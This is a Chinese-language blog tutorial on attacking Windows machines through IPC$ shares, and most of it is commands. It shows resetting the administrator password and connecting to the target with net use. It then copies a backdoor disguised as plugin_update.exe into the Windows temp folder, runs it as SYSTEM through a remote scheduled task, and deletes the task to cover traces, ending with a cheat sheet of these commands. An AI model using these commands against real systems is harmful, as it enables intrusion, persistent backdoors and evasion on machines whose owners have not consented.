# [IPC$渗透使用](https://www.cnblogs.com/sstfy/p/10414680.html)



### 简介[#](https://www.cnblogs.com/sstfy/p/10414680.html#1543578800)

IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

### 使用条件[#](https://www.cnblogs.com/sstfy/p/10414680.html#448862943)

> 1.开放了139、445端口；
> 2.目标开启ipc$文件共享；
> 3.获取用户账号密码。

### 测试过程[#](https://www.cnblogs.com/sstfy/p/10414680.html#1858413825)

此测试前提是获取了ipc$，
这里测试的时候得到的权限是system，然后创建了一个admin账户，给了administrators权限，但无法复制文件过去，于是就改了administrator账户密码（实战中不建议更改，可读取管理密码后再用读到的密码）。
更改密码：`net user administrator "1qaz@WSX"`

- 1.连接目标ipc$，将后门复制到目标机器上

```
Copynet use \\193.168.1.12\ipc$ /user:administrator "1qaz@WSX"
copy plugin_update.exe \\193.168.1.12\c$\windows\temp\plugin_update.exe
```

[![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191116598-11030526.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191116598-11030526.png)

- 2.创建自动任务，执行上传的后门程序

```
Copy# 查看目标机器时间
net time \\193.168.1.12
# 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update
schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st 16:32 /S 193.168.1.12 /RU System /u administrator /p "1qaz@WSX"
# 如果不想等，可以立即运行后门程序
schtasks /run /tn "plugin_update" /S 193.168.1.12 /u administrator /p "1qaz@WSX"
# 删除创建的任务
schtasks /F /delete /tn "plugin_update" /S 193.168.1.12 /u administrator /p "1qaz@WSX"
```

[![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191135932-1958618395.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191135932-1958618395.png)

接收端的目标机器已上线。
[![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191144554-2021989624.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190221191144554-2021989624.png)

### 常用命令[#](https://www.cnblogs.com/sstfy/p/10414680.html#1029992543)

```
Copy# 1.连接
net use \\193.168.1.12\ipc$ /user:administrator "1qaz@WSX"
# 2.查看连接情况
net use
# 3.查看目标主机共享资源
net view \\193.168.1.12
# 4.查看目标主机时间
net time \\193.168.1.12
# 5.查看目标主机的NetBIOS用户（自己本机也需开启）
nbtstat -A 193.168.1.12
# 6.删除连接
net use \\193.168.1.12\ipc$ /del
# 7.文件上传下载
copy plugin_update.exe \\193.168.1.12\c$\windows\temp\plugin_update.exe   
（上传到目标的:c\windows\temp\目录下）
copy \\127.0.0.1\c$\test.exe c:\
（下载到本地c盘下）
# 8.创建计划任务
schtasks /create /tn "plugin_update" /tr c:\windows\temp\plugin_update.exe /sc once /st 1 6:32 /S 193.168.1.12 /RU System /u administrator /p "1qaz@WSX"
# 9.立即执行计划任务
schtasks /run /tn "plugin_update" /S 193.168.1.12 /u administrator /p "1qaz@WSX"
# 10.删除计划任务
schtasks /F /delete /tn "plugin_update" /S 193.168.1.12 /u administrator /p "1qaz@WSX"
```

作者： 素时听风

